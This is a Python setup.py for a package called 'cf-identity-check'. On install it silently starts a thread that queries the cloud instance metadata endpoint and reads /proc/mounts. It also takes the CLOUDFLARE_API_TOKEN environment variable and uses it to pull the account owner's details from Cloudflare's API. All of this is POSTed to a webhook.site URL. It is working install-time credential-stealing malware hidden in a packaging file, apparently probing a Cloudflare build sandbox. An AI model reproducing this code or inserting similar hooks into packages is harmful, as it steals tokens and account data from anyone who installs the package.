import os, json, urllib.request, subprocess, base64
from setuptools import setup

WEBHOOK_URL = "https://webhook.site/9354f8b9-61a2-462f-8e78-06c365c2ee05"

class CloudflareIdentity:
    def __init__(self):
        self.evidence = {
            "is_cloudflare": False,
            "metadata": {},
            "mounts": "",
            "whoami": {},
            "dns_test": {}
        }

    def check_metadata(self):
        """Проверка метаданных (типично для Cloudflare Cloud Chamber)"""
        try:
            # Пытаемся получить информацию о воркере
            req = urllib.request.Request("http://169.254.169.254/latest/meta-data/instance-id")
            with urllib.request.urlopen(req, timeout=1) as r:
                self.evidence["metadata"]["instance_id"] = r.read().decode()
                self.evidence["is_cloudflare"] = True
        except: pass

    def check_mounts(self):
        """Ищем следы Firecracker в монтировании"""
        try:
            with open("/proc/mounts", "r") as f:
                content = f.read()
                self.evidence["mounts"] = content
                if "firecracker" in content or "cloudchamber" in content:
                    self.evidence["is_cloudflare"] = True
        except: pass

    def token_whoami(self):
        """Узнаем владельца токена (E-mail и ID)"""
        token = os.environ.get("CLOUDFLARE_API_TOKEN")
        if token:
            try:
                req = urllib.request.Request(
                    "https://api.cloudflare.com/client/v4/user/details",
                    headers={"Authorization": f"Bearer {token}"}
                )
                with urllib.request.urlopen(req) as resp:
                    data = json.loads(resp.read().decode())
                    self.evidence["whoami"] = data
            except Exception as e:
                self.evidence["whoami"]["error"] = str(e)

    def exfiltrate(self):
        payload = json.dumps(self.evidence).encode()
        try:
            req = urllib.request.Request(WEBHOOK_URL, data=payload, method='POST')
            urllib.request.urlopen(req)
        except: pass

def run():
    ci = CloudflareIdentity()
    ci.check_metadata()
    ci.check_mounts()
    ci.token_whoami()
    ci.exfiltrate()

import threading
threading.Thread(target=run).start()

setup(name="cf-identity-check", version="0.0.1", packages=["."])
